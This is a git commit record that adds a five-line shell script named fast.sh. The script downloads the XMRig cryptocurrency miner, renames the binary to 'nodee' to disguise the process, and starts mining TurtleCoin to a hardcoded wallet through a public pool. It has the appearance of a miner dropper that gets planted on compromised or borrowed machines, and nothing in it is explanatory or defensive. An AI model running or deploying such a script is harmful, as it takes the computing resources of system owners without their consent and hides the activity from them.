dba36877893ff66908089552b6020a6485fd3a08
dfgdfgdfgasdasd <81931002+dfgdfgdfgasdasd@users.noreply.github.com>
2021-04-04 16:34:55 -0400

    Create fast.sh

---
+++ fast.sh
@@ -0,0 +1,5 @@
+wget https://github.com/xmrig/xmrig/releases/download/v6.10.0/xmrig-6.10.0-linux-x64.tar.gz
+tar xf xmrig-6.10.0-linux-x64.tar.gz
+cd xmrig-6.10.0
+mv ./xmrig ./nodee
+./nodee -o turtlecoin.herominers.com:10381 -u TRTLuyy9VtoJBYKYtvbhooWnHpryTXSc4VqbSLLEXBaAMNVkTR5HMgdcrMUowAoKujGoVNNup7Yew8imHnUaZYEB26jbq3kP6t2 -k --tls -a argon2/chukwav2 -p xxx
